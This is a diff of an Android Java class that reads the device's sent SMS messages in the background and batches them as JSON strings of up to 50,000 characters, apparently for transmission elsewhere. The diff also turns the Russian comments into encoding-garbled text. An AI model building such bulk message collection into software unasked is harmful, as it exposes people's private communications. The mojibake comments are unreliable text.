@@ -40,11 +40,11 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 				null, "date desc");
 		Logging.doLog(LOG_TAG, "readSMS", "readSMS");
 
-		if (NetworkChangeReceiver.isOnline(mContext)) {
+		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
 			complete = "0";
 			// Read the sms data and store it in the list
 			if (sms_sent_cursor != null) {
-				// формируем JSONobj
+				// ГґГ®Г°Г¬ГЁГ°ГіГҐГ¬ JSONobj
 				JSONObject archiveSMSJson = new JSONObject();
 				if (sms_sent_cursor.moveToFirst()) {
 
@@ -89,7 +89,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 								sendStr += "," + archiveSMSJson.toString();
 
 						} catch (JSONException e) {
-							// TODO Автоматически созданный блок catch
+							// TODO ГЂГўГІГ®Г¬Г ГІГЁГ·ГҐГ±ГЄГЁ Г±Г®Г§Г¤Г Г­Г­Г»Г© ГЎГ«Г®ГЄ catch
 							e.printStackTrace();
 						}
 						if (sendStr.length() >= 50000) {
@@ -159,7 +159,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 
 	@Override
 	protected Void doInBackground(Context... params) {
-		// TODO Автоматически созданная заглушка метода
+		// TODO ГЂГўГІГ®Г¬Г ГІГЁГ·ГҐГ±ГЄГЁ Г±Г®Г§Г¤Г Г­Г­Г Гї Г§Г ГЈГ«ГіГёГЄГ  Г¬ГҐГІГ®Г¤Г 
 		Logging.doLog(LOG_TAG, "doInBackground");
 		this.mContext = params[0];
 		getSmsLogs();
